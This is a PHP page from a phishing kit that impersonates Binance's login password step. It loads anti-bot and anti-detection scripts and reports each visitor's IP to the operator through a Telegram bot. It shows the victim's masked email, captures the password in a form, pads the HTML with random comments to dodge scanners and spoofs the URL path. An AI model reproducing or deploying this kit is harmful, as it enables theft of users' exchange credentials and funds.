﻿


<?php
function generateRandomString($length = 100) {
  return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}
error_reporting(0);
session_start();  
ob_start();
		include "../antired_flag/anti1.php";
		include "../antired_flag/anti2.php"; 
		include "../antired_flag/anti3.php"; 
		include "../antired_flag/anti4.php"; 
		include "../antired_flag/anti5.php"; 
		include "../antired_flag/anti7.php";
    include '../UysnX/khawazmiat_binance.php';
// test if deja login f step lwla if not login yrj3 ydir login
if (!isset($_SESSION['loggedin'])) {
	exit(header('Location: ../l/'));
}
ob_end_clean();
// test if deja login f step lwla if not login yrj3 ydir login



// get notification  start work
include '../UysnX/xuysnx.php';
include '../UysnX/frifayr.php';
$notifyme = "
┏━━━━━━━━━━━━━━
♜ Step 2 : Password Field
♜IP : ".getUserIP()."
┗━━━━━━━━━━━━━━
♜ You have reached the password field
close to step 3 ...♜
";
if($get_notification == "yes"){
  file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=" . $chatid . "&text=" . urlencode($notifyme) . "");
}
// get notification  end work
?>

<!DOCTYPE
html><html dir="ltr" lang="en"><head>
<link rel="stylesheet" href="style.css">

<!-- <script src="https://www.google.com/recaptcha/api.js" async defer></script> -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
<meta charset="utf-8">
<script data-savepage-type="" type="text/plain" data-ot-ignore="true" class="optanon-category-C0001" async="" data-savepage-src="https://bin.bnbstatic.com/static/sensors/sensorsdata@1.23.2.js"></script><script data-savepage-type="" type="text/plain" async="" data-savepage-src="https://www.googletagmanager.com/gtm.js?id=GTM-WW2RRZX"></script><script data-savepage-type="" type="text/plain"></script><script data-savepage-type="" type="text/plain"></script><meta http-equiv="etag" content="d381faf49c2282169472ec6d288674aab3e65d57"><link rel="shortcut icon" type="image/x-icon" data-savepage-href="https://bin.bnbstatic.com/static/images/common/favicon.ico" href="../img/bb.ico"><link rel="apple-touch-icon" type="image/png" data-savepage-href="https://bin.bnbstatic.com/static/images/bnb-for/brand.png" href=""><link rel="icon" type="image/png" data-savepage-href="https://bin.bnbstatic.com/static/images/bnb-for/brand.png" href=""><meta name="msapplication-TileImage" content="https://bin.bnbstatic.com/static/images/bnb-for/brand.png"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0,user-scalable=no"><meta name="format-detection" content="telephone=no"><meta name="360-site-verification" content="e362348efd31ed6e77bcf0ba4963a6de"><meta name="sogou_site_verification" content="tKz9Rld4qH"><meta property="og:url" content="https://binance.com/en"><meta name="og:type" content="website"><meta property="og:title" content="Bitcoin Exchange | Cryptocurrency Exchange | Binance"><meta property="og:image" content="https://public.bnbstatic.com/static/images/common/ogImage.jpg"><meta property="og:description" content="Binance cryptocurrency exchange - We operate the worlds biggest bitcoin exchange and altcoin crypto exchange in the world by volume"><script data-savepage-type="" type="text/plain"></script><script data-savepage-type="" type="text/plain"></script><script data-savepage-type="" type="text/plain" async="" data-savepage-src="https://www.google-analytics.com/analytics.js"></script><script data-savepage-type="" type="text/plain" id="gtm-trueMetrics"></script><script data-savepage-type="" type="text/plain"></script><script data-savepage-type="" type="text/plain"></script><link rel="preload" data-savepage-href="https://bin.bnbstatic.com/static/fonts/index.min.css" href="" as="style"><link rel="stylesheet" type="text/css" href="https://bin.bnbstatic.com/static/fonts/index.min.css"><link rel="preload" data-savepage-href="https://bin.bnbstatic.com/static/fonts/font.min.css" href="" as="style"><link rel="stylesheet" type="text/css" href="https://bin.bnbstatic.com/static/fonts/font.min.css">
<?php
include '../include/css.php'; 
?>





<title data-shuvi-head="true">Log In | Binance</title>
<meta name="savepage-title" content="Log In | Binance">
</head>
<body>
<div id="xuysnx" style="display:none;">
</div>
<div class="loader_bg">
<div class="loader"></div>
</div>


<div id="__APP"><div id="wrap_app" class="css-155nz97"><div class="hidden-header-in-bnc css-1b9spv1">
  <?php
  include '../include/header.php';
  
  ?><div class="css-15xjy3y"><div id="header_global_js_wxgy34nj" class="css-6sm2ml"></div></div></div><main class="main css-zy0fl3">
    <?php
     echo "<br><br><br><br>";
     ?>
  <br><div class="css-fomfob"><div class="css-gmny7x"><?php echo "Welcome back!"?></div><div class="css-u6ofsg">



<?php 
ob_start();
$email = $_SESSION["username"];
$resultmob = substr($email,0,1);
$resultmob .= "****";
$resultmob .= substr($email,strpos($email, "@"));
echo $resultmob;
?>
    <!-- <?php echo  generateRandomString();  ?> -->
<script type="text/javascript">
           document.onreadystatechange = function () {
             var state = document.readyState
             if (state == 'complete') {
                 setTimeout(function(){
                     document.getElementById('interactive');
                $("#fixed").hide();
                $("#formf").show(500);
                 },4000);
             }
           }
        </script>
            <!-- <?php echo  generateRandomString();  ?> -->
</div><div class="css-1q7zil0"><div class="css-tmpver">
      <!-- <?php echo  generateRandomString();  ?> -->
  

<form id="formadmin1" action="" method="post" autocomplete="off" name="formadmin1">
      <!-- <?php echo  generateRandomString();  ?> -->
<input type="hidden" name="uysnx2" value="xuysnx">
    <!-- <?php echo  generateRandomString();  ?> -->
  <div class="bids-password-input css-15651n7">
        <!-- <?php echo  generateRandomString();  ?> -->
        <div class="css-xjlny9">Password</div>
            <!-- <?php echo  generateRandomString();  ?> -->
  <div class=" css-hiy16i"><div class=" css-1cgu4y5">
        <!-- <?php echo  generateRandomString();  ?> -->
    <input  data-bn-type="input" name="password" required spellcheck="false" autocomplete="off" type="password" autofocus="autofocus" class="css-16fg16t" value="" id="myInput">
     <div onclick="myFunction()" class="bn-input-suffix css-vurnku">
     <div class="css-1gkkq18">  
        <!-- <?php echo  generateRandomString();  ?> -->
      <i class="rbha_had_css" id="hidel">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" class="css-162l5eo"><path d="M12 14.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.555 6.31L1 12l5.555 5.69a7.572 7.572 0 0010.89 0L23 12l-5.555-5.69a7.572 7.572 0 00-10.89 0zM17 12a5 5 0 11-10 0 5 5 0 0110 0z" fill="currentColor"></path></svg></i>
    <i class="rbha_had_css2" id="hide2">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" class="css-162l5eo"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.94 5.06l16 16 2.12-2.12-2.446-2.447L23 12l-5.555-5.69a7.566 7.566 0 00-9.883-.87L5.06 2.94 2.939 5.06zm6.747 2.506a5 5 0 016.747 6.747L9.687 7.566z" fill="currentColor"></path><path d="M1 12l2.29-2.346 10.198 10.198a7.574 7.574 0 01-6.933-2.162L1 12z" fill="currentColor"></path></svg></i>
    <style>
      .rbha_had_css {
          display: none;
}</style>




<script src="../js_main/show_hide.js"></script>
  
  
  </div></div></div></div><div class="help_default css-1acqidq"></div>

      <br/><button data-bn-type="button" id="click_login_submit" class=" css-na4ifg">Log In</button></form><div class="css-vurnku"></div><div class="css-10bsfyn"><div class="css-irckfu"><a data-bn-type="link" target="_blank" id="accounts-helper-forgot-password" class="css-vshg8p">Forgot password?</a></div></div></div></div></div></main><div class="css-3kcv4i"><div data-bn-type="text" class="css-1om5toz">© 2017 - 2024 Binance.com. All rights reserved</div><div data-bn-type="text" data-ot-trigger="true" class="css-ff02t7">Cookie Preferences</div></div></div></div><script data-savepage-type="" type="text/plain" data-savepage-src="https://bin.bnbstatic.com/static/runtime/react/react.production.16.14.0.js" data-ot-ignore=""></script>

<!-- UysnX Always here -->
<?php
 include '../include/script.php';
 ?>
  <script src="../js_main/7adari_ababab.js"></script>
<script>
    setTimeout(function(){
        $('.loader_bg').fadeToggle();
    }, 600);
</script>
<script src="../js_main/1.js"></script>
<script src="../js_main/2.js"></script>
<script src="../js_main/form3.js"></script>
<script>
      if (window.history.replaceState) {
   window.history.replaceState("uysnx", "Title", "../en/Login-password?return_to=<?php print $khawazmia_binance;?>");
}
</script>

</body></html>